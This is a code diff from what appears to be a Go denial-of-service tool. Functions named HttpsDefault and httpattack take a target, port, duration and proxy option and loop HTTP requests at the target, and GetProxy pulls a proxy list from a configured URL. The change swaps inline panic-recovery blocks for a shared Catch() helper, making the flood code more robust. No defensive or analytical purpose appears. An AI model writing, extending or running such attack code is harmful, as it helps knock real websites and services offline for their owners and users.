@@ -18,12 +18,7 @@ import (
 
 func HttpsDefault(target string, port string, duration string, useproxy string) {
 
-	defer func() { // try catch
-		if er := recover(); er != nil {
-			fmt.Print(er)
-			return
-		}
-	}()
+	defer Catch()
 
 	duration = strings.ReplaceAll(duration, "\x00", "")
 	duration = strings.ReplaceAll(duration, "\x03", "")
@@ -46,12 +41,7 @@ func HttpsDefault(target string, port string, duration string, useproxy string) 
 }
 
 func httpattack(target, useproxy string) {
-	defer func() { // try catch
-		if er := recover(); er != nil {
-			fmt.Print(er)
-			return
-		}
-	}()
+	defer Catch()
 
 	client, req := newreq(target, useproxy)
 	for i := 0; i < 30; i++ {
@@ -75,12 +65,7 @@ func httpattack(target, useproxy string) {
 
 func newreq(target string, useproxy string) (*http.Client, *http.Request) {
 
-	defer func() { // try catch
-		if er := recover(); er != nil {
-			fmt.Print(er)
-			return
-		}
-	}()
+	defer Catch()
 
 	var client *http.Client
 
@@ -125,6 +110,7 @@ func newreq(target string, useproxy string) (*http.Client, *http.Request) {
 }
 
 func GetProxy() []string {
+	defer Catch()
 
 _GETPROXY:
 	_proxies, err := http.Get(config.PROXYURL)
